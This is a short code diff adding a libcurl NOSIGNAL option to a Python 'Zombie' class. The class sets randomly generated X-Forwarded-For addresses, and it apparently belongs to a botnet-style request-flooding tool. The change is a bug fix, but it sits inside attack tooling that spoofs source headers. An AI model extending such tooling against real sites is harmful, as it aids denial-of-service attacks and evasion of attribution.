@@ -92,6 +92,7 @@ class Zombie: # class representing a zombie
         c.setopt(pycurl.COOKIEFILE, '/dev/null') # black magic
         c.setopt(pycurl.COOKIEJAR, '/dev/null') # black magic
         c.setopt(pycurl.FRESH_CONNECT, 1) # important: no cache!
+        c.setopt(pycurl.NOSIGNAL, 1) # pass 'long' to stack to fix libcurl bug
         if options.xforw: # set x-forwarded-for
             generate_random_xforw = RandomIP()
             xforwip = generate_random_xforw._generateip('')
